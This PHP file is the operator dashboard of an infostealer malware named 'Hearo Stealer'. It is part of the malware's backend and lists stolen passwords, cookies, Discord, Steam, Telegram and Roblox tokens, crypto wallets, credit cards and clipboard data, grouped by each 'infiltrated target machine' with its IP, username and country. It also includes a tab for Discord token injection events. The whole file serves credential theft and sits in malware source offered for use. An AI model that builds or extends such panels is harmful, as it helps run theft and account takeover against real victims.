<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

$totalPasswords = $db->query("SELECT SUM(passwords_count) FROM logs")->fetchColumn() ?: 0;
$totalCookies   = $db->query("SELECT SUM(cookies_count) FROM logs")->fetchColumn() ?: 0;
$totalDiscord   = $db->query("SELECT SUM(discord_tokens) FROM logs")->fetchColumn() ?: 0;
$totalCards     = $db->query("SELECT SUM(credit_cards) FROM logs")->fetchColumn() ?: 0;
$totalTargets   = $db->query("SELECT COUNT(DISTINCT session_hash) FROM logs")->fetchColumn() ?: 0;
$totalClipboard = $db->query("SELECT COUNT(*) FROM logs WHERE clipboard_data != ''")->fetchColumn() ?: 0;
$totalFiles     = $db->query("SELECT SUM(interesting_files) FROM logs")->fetchColumn() ?: 0;
$totalSteam     = $db->query("SELECT SUM(steam_tokens) FROM logs")->fetchColumn() ?: 0;
$totalRoblox    = $db->query("SELECT SUM(roblox_cookies) FROM logs")->fetchColumn() ?: 0;
$totalTelegram  = $db->query("SELECT SUM(telegram_sessions) FROM logs")->fetchColumn() ?: 0;
$totalCrypto    = $db->query("SELECT SUM(crypto_wallets) FROM logs")->fetchColumn() ?: 0;

$logs = $db->query("SELECT * FROM logs ORDER BY captured_at DESC LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);

// Discord events
$discordEvents = $db->query("SELECT * FROM discord_events ORDER BY captured_at DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aggregated Vault Logs — Hearo Stealer</title>
    <link rel="icon" href="xeff/assets/logo.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="xeff/css/elite.css">
    <link rel="stylesheet" href="xeff/assets/theme.css">
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>

    <?php include 'xeff/includes/navbar.php'; ?>

    <div class="container">
        <div class="page-header">
            <h1>Aggregated Vault Logs</h1>
            <p>Consolidated database across <?= number_format($totalTargets) ?> infiltrated target machines.</p>
        </div>

        <div class="stats-row">
            <div class="stat-box"><div class="val"><?= number_format($totalPasswords) ?></div><div class="lbl">Consolidated Passwords</div></div>
            <div class="stat-box"><div class="val"><?= number_format($totalCookies) ?></div><div class="lbl">Captured Cookies</div></div>
            <div class="stat-box"><div class="val"><?= number_format($totalDiscord) ?></div><div class="lbl">Discord Tokens</div></div>
            <div class="stat-box"><div class="val"><?= number_format($totalTargets) ?></div><div class="lbl">Target Machines</div></div>
        </div>

        <div class="tabs-bar">
            <button class="tab-btn active" onclick="switchTab('targets', this)"><i class="fa-solid fa-desktop" style="font-size:11px;"></i> Targets <span class="tab-count"><?= $totalTargets ?></span></button>
            <button class="tab-btn" onclick="switchTab('passwords', this)"><i class="fa-solid fa-key" style="font-size:11px;"></i> Passwords <span class="tab-count"><?= number_format($totalPasswords) ?></span></button>
            <button class="tab-btn" onclick="switchTab('discord', this)"><i class="fa-brands fa-discord" style="font-size:11px;"></i> Discord <span class="tab-count"><?= $totalDiscord ?></span></button>
            <button class="tab-btn" onclick="switchTab('steam', this)"><i class="fa-brands fa-steam" style="font-size:11px;"></i> Steam <span class="tab-count"><?= $totalSteam ?></span></button>
            <button class="tab-btn" onclick="switchTab('roblox', this)"><i class="fa-solid fa-gamepad" style="font-size:11px;"></i> Roblox <span class="tab-count"><?= $totalRoblox ?></span></button>
            <button class="tab-btn" onclick="switchTab('crypto', this)"><i class="fa-solid fa-wallet" style="font-size:11px;"></i> Crypto <span class="tab-count"><?= $totalCrypto ?></span></button>
            <button class="tab-btn" onclick="switchTab('telegram', this)"><i class="fa-brands fa-telegram" style="font-size:11px;"></i> Telegram <span class="tab-count"><?= $totalTelegram ?></span></button>
            <button class="tab-btn" onclick="switchTab('cards', this)"><i class="fa-solid fa-credit-card" style="font-size:11px;"></i> Cards <span class="tab-count"><?= $totalCards ?></span></button>
            <button class="tab-btn" onclick="switchTab('injection', this)"><i class="fa-solid fa-syringe" style="font-size:11px;"></i> Injection <span class="tab-count"><?= count($discordEvents) ?></span></button>
        </div>

        <div class="search-actions">
            <div class="search-wrap">
                <i class="fa-solid fa-magnifying-glass"></i>
                <input type="text" class="search-field" placeholder="Search logs..." id="vaultSearch" oninput="filterVault()">
            </div>
        </div>

        <!-- TARGETS TAB -->
        <div class="tab-content active" id="tab-targets">
            <div class="data-panel">
                <table>
                    <thead><tr><th>Machine</th><th>User</th><th>IP</th><th>Country</th><th>OS</th><th>Passwords</th><th>Cookies</th><th>Discord</th><th>Steam</th><th>Crypto</th><th>Time</th></tr></thead>
                    <tbody>
                    <?php foreach($logs as $l): ?>
                    <tr class="vault-row" data-search="<?= strtolower($l['computer_name'].' '.$l['username'].' '.$l['ip'].' '.$l['country']) ?>">
                        <td><?= sanitize($l['computer_name']) ?></td>
                        <td><?= sanitize($l['username']) ?></td>
                        <td style="font-family:var(--mono);font-size:11px;"><?= sanitize($l['ip']) ?></td>
                        <td><span class="badge-sm"><?= sanitize($l['country']) ?></span></td>
                        <td style="font-size:11px;color:var(--text-muted);"><?= sanitize($l['os_version']) ?></td>
                        <td style="color:#10b981;"><?= $l['passwords_count'] ?></td>
                        <td style="color:#f59e0b;"><?= $l['cookies_count'] ?></td>
                        <td style="color:#5865f2;"><?= $l['discord_tokens'] ?></td>
                        <td style="color:#2a9fd6;"><?= $l['steam_tokens'] ?></td>
                        <td style="color:#f7931a;"><?= $l['crypto_wallets'] ?></td>
                        <td style="font-family:var(--mono);font-size:10px;color:var(--text-muted);"><?= timeAgo($l['captured_at']) ?></td>
                    </tr>
                    <?php endforeach; ?>
                    <?php if (empty($logs)): ?><tr><td colspan="11" class="empty-state">No targets logged yet.</td></tr><?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Other tabs with aggregated view -->
        <?php
        $tabConfigs = [
            'passwords' => ['title' => 'Password entries', 'col' => 'passwords_count'],
            'discord' => ['title' => 'Discord tokens', 'col' => 'discord_tokens'],
            'steam' => ['title' => 'Steam sessions', 'col' => 'steam_tokens'],
            'roblox' => ['title' => 'Roblox cookies', 'col' => 'roblox_cookies'],
            'crypto' => ['title' => 'Crypto wallets', 'col' => 'crypto_wallets'],
            'telegram' => ['title' => 'Telegram sessions', 'col' => 'telegram_sessions'],
            'cards' => ['title' => 'Credit cards', 'col' => 'credit_cards'],
        ];
        foreach ($tabConfigs as $tabId => $cfg): ?>
        <div class="tab-content" id="tab-<?= $tabId ?>">
            <div class="data-panel">
                <table>
                    <thead><tr><th>Machine</th><th>User</th><th>IP</th><th>Country</th><th><?= $cfg['title'] ?></th><th>Captured</th><th>Action</th></tr></thead>
                    <tbody>
                    <?php foreach($logs as $l): if ($l[$cfg['col']] > 0): ?>
                    <tr class="vault-row" data-search="<?= strtolower($l['computer_name'].' '.$l['username'].' '.$l['ip']) ?>">
                        <td><?= sanitize($l['computer_name']) ?></td>
                        <td><?= sanitize($l['username']) ?></td>
                        <td style="font-family:var(--mono);font-size:11px;"><?= sanitize($l['ip']) ?></td>
                        <td><span class="badge-sm"><?= sanitize($l['country']) ?></span></td>
                        <td style="color:#10b981;font-weight:600;"><?= $l[$cfg['col']] ?></td>
                        <td style="font-family:var(--mono);font-size:10px;color:var(--text-muted);"><?= timeAgo($l['captured_at']) ?></td>
                        <td><a href="view_session.php?session=<?= urlencode($l['session_hash']) ?>" style="color:rgba(147,51,234,0.8);font-size:11px;text-decoration:none;">View →</a></td>
                    </tr>
                    <?php endif; endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        <?php endforeach; ?>

        <!-- Injection events tab -->
        <div class="tab-content" id="tab-injection">
            <div class="data-panel">
                <table>
                    <thead><tr><th>Session</th><th>Event Type</th><th>Data</th><th>Captured</th></tr></thead>
                    <tbody>
                    <?php foreach($discordEvents as $ev): ?>
                    <tr>
                        <td style="font-family:var(--mono);font-size:10px;"><?= sanitize(substr($ev['session_hash'], 0, 12)) ?>...</td>
                        <td><span class="badge-sm"><?= sanitize($ev['event_type']) ?></span></td>
                        <td style="font-family:var(--mono);font-size:10px;color:var(--text-muted);max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"><?= sanitize($ev['event_data']) ?></td>
                        <td style="font-family:var(--mono);font-size:10px;color:var(--text-muted);"><?= timeAgo($ev['captured_at']) ?></td>
                    </tr>
                    <?php endforeach; ?>
                    <?php if (empty($discordEvents)): ?><tr><td colspan="4" class="empty-state">No Discord injection events captured yet.</td></tr><?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabId, btn) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            btn.classList.add('active');
        }
        function filterVault() {
            const q = document.getElementById('vaultSearch').value.toLowerCase();
            document.querySelectorAll('.vault-row').forEach(r => {
                r.style.display = r.dataset.search.includes(q) ? '' : 'none';
            });
        }
    </script>
</body>
</html>
